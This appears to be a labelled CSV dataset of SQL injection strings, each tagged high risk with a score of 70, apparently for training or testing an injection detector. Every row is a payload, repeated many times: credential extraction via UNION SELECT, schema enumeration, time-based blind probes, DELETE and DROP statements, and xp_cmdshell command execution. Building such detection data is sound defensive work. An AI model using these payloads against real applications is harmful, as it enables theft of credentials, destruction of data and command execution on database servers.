query,risk,score
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DROP PROCEDURE admin_login--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DROP PROCEDURE admin_login--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DELETE FROM users; /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DROP PROCEDURE admin_login--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DELETE FROM users; /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DELETE FROM users; /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR SLEEP(5) AND '1'='1,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; SELECT pg_sleep(5); --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DROP PROCEDURE admin_login--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DELETE FROM users; /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DROP PROCEDURE admin_login--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DELETE FROM users; /**/,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DELETE FROM users; /**/,high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DELETE FROM users; /**/,high,70
'; DELETE FROM users; /**/,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; SELECT pg_sleep(5); --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; SELECT pg_sleep(5); --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DELETE FROM users; /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DROP PROCEDURE admin_login--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; SELECT pg_sleep(5); --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DROP PROCEDURE admin_login--,high,70
'; DELETE FROM users; /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DELETE FROM users; /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; SELECT pg_sleep(5); --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; SELECT pg_sleep(5); --,high,70
' OR SLEEP(5) AND '1'='1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DROP PROCEDURE admin_login--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DROP PROCEDURE admin_login--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR SLEEP(5) AND '1'='1,high,70
'; SELECT pg_sleep(5); --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; SELECT pg_sleep(5); --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DELETE FROM users; /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DROP PROCEDURE admin_login--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DROP PROCEDURE admin_login--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR SLEEP(5) AND '1'='1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; SELECT pg_sleep(5); --,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
'; DROP PROCEDURE admin_login--,high,70
'; DELETE FROM users; /**/,high,70
'; DROP PROCEDURE admin_login--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DELETE FROM users; /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DELETE FROM users; /**/,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; SELECT pg_sleep(5); --,high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DROP PROCEDURE admin_login--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; SELECT pg_sleep(5); --,high,70
'; DELETE FROM users; /**/,high,70
'; SELECT pg_sleep(5); --,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DELETE FROM users; /**/,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DROP PROCEDURE admin_login--,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DELETE FROM users; /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; SELECT pg_sleep(5); --,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DROP PROCEDURE admin_login--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DELETE FROM users; /**/,high,70
'; SELECT pg_sleep(5); --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DELETE FROM users; /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; SELECT pg_sleep(5); --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DROP PROCEDURE admin_login--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR SLEEP(5) AND '1'='1,high,70
'; SELECT pg_sleep(5); --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
